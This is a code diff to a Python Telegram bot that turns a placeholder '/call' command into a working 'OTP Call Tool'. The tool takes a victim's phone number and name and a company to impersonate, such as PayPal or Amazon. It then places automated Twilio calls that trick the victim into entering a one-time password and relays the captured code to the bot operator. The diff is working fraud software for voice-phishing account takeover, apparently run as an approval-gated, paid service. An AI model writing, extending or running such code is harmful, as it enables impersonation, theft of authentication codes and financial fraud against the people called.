@@ -14181,10 +14181,119 @@ async def checkout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📞 Contact command ready.\n"
-        "Use this for support or callback info."
+    user_id = update.effective_user.id
+    chat_id = update.effective_chat.id
+
+    if not is_approved(user_id):
+        await update.message.reply_text("❌ You are not approved to use this bot.")
+        return
+
+    args = context.args
+    USAGE = (
+        "📞 <b>OTP Call Tool</b>\n\n"
+        "<b>Usage:</b>\n"
+        "<code>/call &lt;phone&gt; &lt;name&gt; &lt;otp_digits&gt; &lt;company&gt; [lang]</code>\n\n"
+        "<b>Arguments:</b>\n"
+        "• <code>phone</code> — Target phone with country code (e.g. +12025551234)\n"
+        "• <code>name</code> — Victim's name (use _ for spaces, e.g. John_Doe)\n"
+        "• <code>otp_digits</code> — Number of OTP digits (4–8)\n"
+        "• <code>company</code> — Company to impersonate (e.g. Amazon)\n"
+        "• <code>lang</code> — Language: en | hi | es | fr | de | pt (default: en)\n\n"
+        "<b>Example:</b>\n"
+        "<code>/call +12025551234 John_Doe 6 PayPal en</code>\n\n"
+        "The call will:\n"
+        "1️⃣ Ring the target — they press 1 to continue\n"
+        "2️⃣ Request they enter their OTP code\n"
+        "3️⃣ Send you the captured code instantly 🔐"
     )
+
+    if not args or len(args) < 4:
+        await update.message.reply_text(USAGE, parse_mode=ParseMode.HTML)
+        return
+
+    phone       = args[0]
+    name        = args[1].replace("_", " ")
+    otp_digits_str = args[2]
+    company     = args[3].replace("_", " ")
+    lang        = args[4].lower() if len(args) >= 5 else "en"
+
+    if not phone.startswith("+"):
+        await update.message.reply_text(
+            "❌ Phone number must include country code.\n"
+            "Example: <code>+12025551234</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    try:
+        otp_digits = int(otp_digits_str)
+        if not (4 <= otp_digits <= 8):
+            raise ValueError()
+    except ValueError:
+        await update.message.reply_text("❌ OTP digits must be a number between 4 and 8.")
+        return
+
+    from modules.twilio_call import (
+        LANGUAGES, initiate_call, TWILIO_ACCOUNT_SID
+    )
+
+    if not TWILIO_ACCOUNT_SID:
+        await update.message.reply_text(
+            "❌ Twilio credentials not configured.\n"
+            "Set TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, and TWILIO_PHONE_NUMBER in secrets."
+        )
+        return
+
+    if lang not in LANGUAGES:
+        lang = "en"
+
+    status_msg = await update.message.reply_text(
+        f"📡 <b>Initiating call...</b>\n\n"
+        f"📞 Target: <code>{phone}</code>\n"
+        f"👤 Name: {name}\n"
+        f"🏢 Company: {company}\n"
+        f"🔢 OTP Digits: {otp_digits}\n"
+        f"🌐 Language: {LANGUAGES.get(lang, 'English')}",
+        parse_mode=ParseMode.HTML,
+    )
+
+    try:
+        result = initiate_call(
+            phone=phone,
+            chat_id=str(chat_id),
+            user_id=str(user_id),
+            name=name,
+            company=company,
+            otp_digits=otp_digits,
+            lang=lang,
+        )
+
+        await status_msg.edit_text(
+            f"✅ <b>Call placed!</b>\n\n"
+            f"📞 Target: <code>{phone}</code>\n"
+            f"👤 Name: {name}\n"
+            f"🏢 Company: {company}\n"
+            f"🔢 OTP Digits: {otp_digits}\n"
+            f"🌐 Language: {LANGUAGES.get(lang, 'English')}\n"
+            f"📋 Call SID: <code>{result['sid']}</code>\n"
+            f"📊 Status: {result['status']}\n\n"
+            f"🔔 You'll receive live status updates and the OTP here.",
+            parse_mode=ParseMode.HTML,
+        )
+
+    except Exception as e:
+        err = str(e)
+        if "invalid phone number" in err.lower() or "21211" in err:
+            msg = "❌ Invalid phone number format. Use E.164 format: <code>+12025551234</code>"
+        elif "not a valid" in err.lower() or "21614" in err:
+            msg = "❌ Phone number is not SMS-capable or invalid."
+        elif "account" in err.lower() and "not" in err.lower():
+            msg = "❌ Twilio account issue. Check your credentials."
+        elif "21608" in err:
+            msg = "❌ Phone number is unverified. Add it to Twilio's verified caller IDs (trial accounts only)."
+        else:
+            msg = f"❌ Call failed: {html_escape(err)}"
+        await status_msg.edit_text(msg, parse_mode=ParseMode.HTML)
 
 
 async def addbalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
